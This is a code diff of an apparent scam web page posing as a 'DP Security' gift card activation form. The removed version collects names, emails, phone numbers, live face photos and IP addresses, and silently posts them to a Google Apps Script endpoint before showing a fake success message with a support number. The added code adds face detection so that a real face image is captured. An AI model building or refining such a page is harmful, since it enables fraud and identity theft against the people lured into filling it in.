@@ -1,197 +1,67 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DP Security Gift Card Activation</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 0;
-            background: radial-gradient(circle at center, #1a1c2c 0%, #0d0e14 100%);
-            color: #e0e0e0;
-            display: flex; flex-direction: column; min-height: 100vh;
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision/vision_bundle.mjs" type="module"></script>
+
+<script type="module">
+    // Import Face Detector
+    import { FaceDetector, FilesetResolver } from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/vision_bundle.mjs";
+    
+    let faceDetector;
+    let isFaceReady = false;
+
+    // Initialize the Face Detector
+    async function initFaceDetection() {
+        const vision = await FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm");
+        faceDetector = await FaceDetector.createFromOptions(vision, {
+            baseOptions: {
+                modelAssetPath: `https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite`,
+                delegate: "GPU"
+            },
+            runningMode: "IMAGE"
+        });
+        isFaceReady = true;
+    }
+    initFaceDetection();
+
+    // 2. Updated Take Photo Logic
+    window.takePhotoAction = async function() {
+        if (!isFaceReady) {
+            alert("Security system initializing... please wait 2 seconds.");
+            return;
         }
-        #successModal {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background-color: #1e1e1e; padding: 30px; border-radius: 12px;
-            box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000;
-            text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0;
-        }
-        #modalOverlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); z-index: 999;
-        }
-        .logo-container img { max-width: 300px; height: auto; display: block; margin: 40px auto; }
-        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .activation-container {
-            background-color: rgba(30, 30, 30, 0.95); padding: 40px; border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7); width: 100%; max-width: 500px; border: 1px solid #333;
-        }
-        h2 { text-align: center; color: #00d9e0; margin-bottom: 30px; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #a0a0a0; }
-        
-        /* Updated styles for select dropdown */
-        input, select {
-            width: 100%; padding: 12px; border: 1px solid #333; border-radius: 6px;
-            background-color: #2a2a2a; color: white; font-size: 16px; box-sizing: border-box;
-        }
-        input:focus, select:focus { outline: none; border-color: #00d9e0; }
 
-        #camera-section { margin-top: 15px; text-align: center; }
-        #video-preview { width: 100%; border-radius: 6px; border: 1px solid #00d9e0; display: none; margin-bottom: 10px; }
-        #captured-photo { width: 100%; border-radius: 6px; display: none; margin-bottom: 10px; border: 1px solid #4caf50; }
-        .cam-btn {
-            background: #333; color: #00d9e0; border: 1px solid #00d9e0; padding: 8px 15px;
-            border-radius: 4px; cursor: pointer; margin-bottom: 10px;
-        }
-        .submit-btn {
-            width: 100%; padding: 15px; background: linear-gradient(135deg, #007bff, #00d9e0);
-            color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
-        }
-        footer { text-align: center; padding: 20px; background-color: #0a0a0a; font-size: 14px; color: #777; }
-    </style>
-</head>
-<body>
-
-<div id="modalOverlay"></div>
-<div id="successModal">
-    <h3 style="color: #00d9e0;">Activation Successful</h3>
-    <p>If you still have any additional issues please call support at 323-374-3366</p>
-    <p style="font-size: 0.8em; color: #777; margin-top: 20px;">(Verification Complete - Security Locked)</p>
-</div>
-
-<header>
-    <div class="logo-container">
-        <img src="https://usbanking.icu/DP.png" alt="DP Security Logo">
-    </div>
-</header>
-
-<main>
-    <div class="activation-container">
-        <h2>Gift Card Activation</h2>
-        <form id="activationForm">
-            <div class="form-group">
-                <label for="cardType">Select Card Type</label>
-                <select id="cardType" name="cardType" required>
-                    <option value="" disabled selected>Choose a card...</option>
-                    <option value="Amazon Card">Amazon Card</option>
-                    <option value="Apple Card">Apple Card</option>
-                    <option value="eBay Card">eBay Card</option>
-                    <option value="Google Play Card">Google Play Card</option>
-                    <option value="Greendot Card">Greendot Card</option>
-                    <option value="Steam Card">Steam Card</option>
-                    <option value="Vanilla Card">Vanilla Card</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$">
-            </div>
-            <div class="form-group">
-                <label for="email">Email Address (Will be used for login)</label>
-                <input type="email" id="email" name="email" required placeholder="john.doe@example.com">
-            </div>
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14">
-            </div>
-            <div class="form-group">
-                <label>Security ID Photo (Real-time Camera Required)</label>
-                <div id="camera-section">
-                    <video id="video-preview" autoplay playsinline></video>
-                    <img id="captured-photo" alt="Captured ID">
-                    <button type="button" id="start-camera" class="cam-btn">Open Camera</button>
-                    <button type="button" id="take-photo" class="cam-btn" style="display:none;">Capture Photo</button>
-                </div>
-            </div>
-            <div class="form-group">
-                <label id="captcha-question" style="color:#00d9e0;"></label>
-                <input type="number" id="captcha-answer" placeholder="Enter result" required>
-            </div>
-            <button type="submit" class="submit-btn">Activate Card</button>
-        </form>
-    </div>
-</main>
-
-<footer>
-    <a href="mock.html" style="cursor: pointer;">Copyright &copy; DP Security <span id="year"></span></a>
-</footer>
-
-<script>
-    document.getElementById('year').textContent = new Date().getFullYear();
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbyfyTIM1xtENwx7ya5hMhIN219pFU-1g-j2FJrBe5QRhnGrvLw5ftG0Ck7xMRpl7N8T/exec';
-
-    document.getElementById('phone').addEventListener('input', function (e) {
-        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
-        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
-    });
-
-    const video = document.getElementById('video-preview');
-    const photo = document.getElementById('captured-photo');
-    const startBtn = document.getElementById('start-camera');
-    const takeBtn = document.getElementById('take-photo');
-    let capturedImageData = null;
-
-    startBtn.onclick = async () => {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.style.display = 'block';
-        startBtn.style.display = 'none';
-        takeBtn.style.display = 'inline-block';
-    };
-
-    takeBtn.onclick = () => {
+        const video = document.getElementById('video-preview');
+        const photo = document.getElementById('captured-photo');
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // Check 1: Blank Image Detection (Pixel Analysis)
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+        let totalBrightness = 0;
+        for (let i = 0; i < imageData.length; i += 4) {
+            totalBrightness += (imageData[i] + imageData[i+1] + imageData[i+2]) / 3;
+        }
+        const avgBrightness = totalBrightness / (imageData.length / 4);
+        
+        if (avgBrightness < 10) { // Too dark/blank
+            alert("Error: Security photo is too dark or blank. Ensure your camera is not covered.");
+            return;
+        }
+
+        // Check 2: Face Detection
+        const detections = faceDetector.detect(canvas).detections;
+        if (detections.length === 0) {
+            alert("Security Verification Failed: No face detected. Please face the camera clearly.");
+            return;
+        }
+
+        // Success: Store the image
         capturedImageData = canvas.toDataURL('image/png');
         photo.src = capturedImageData;
         photo.style.display = 'block';
         video.style.display = 'none';
-        takeBtn.style.display = 'none';
+        document.getElementById('take-photo').style.display = 'none';
         video.srcObject.getTracks().forEach(track => track.stop());
-    };
-
-    let n1 = Math.floor(Math.random() * 12) + 2, n2 = Math.floor(Math.random() * 5) + 2, n3 = Math.floor(Math.random() * 10) + 1;
-    let correctAnswer = (n1 * n2) + n3;
-    document.getElementById('captcha-question').textContent = `Security Math: (${n1} × ${n2}) + ${n3}`;
-
-    document.getElementById('activationForm').onsubmit = async (e) => {
-        e.preventDefault();
-        if (!capturedImageData) { alert("Please take a security photo first."); return; }
-        if (parseInt(document.getElementById('captcha-answer').value) !== correctAnswer) { alert("Security check failed."); return; }
-
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const userIp = ipData.ip;
-
-            const submission = {
-                date: new Date().toLocaleString(),
-                name: document.getElementById('fullName').value,
-                email: document.getElementById('email').value,
-                phone: document.getElementById('phone').value,
-                barcode: document.getElementById('cardType').value, // Sending card type in the barcode slot
-                photo: capturedImageData,
-                status: 'PENDING',
-                ip: userIp
-            };
-
-            await fetch(scriptURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(submission)
-            });
-            document.getElementById('modalOverlay').style.display = 'block';
-            document.getElementById('successModal').style.display = 'block';
-        } catch (error) {
-            alert("System error. Please try again.");
-        }
-    };
+    }
 </script>
-</body>
-</html>
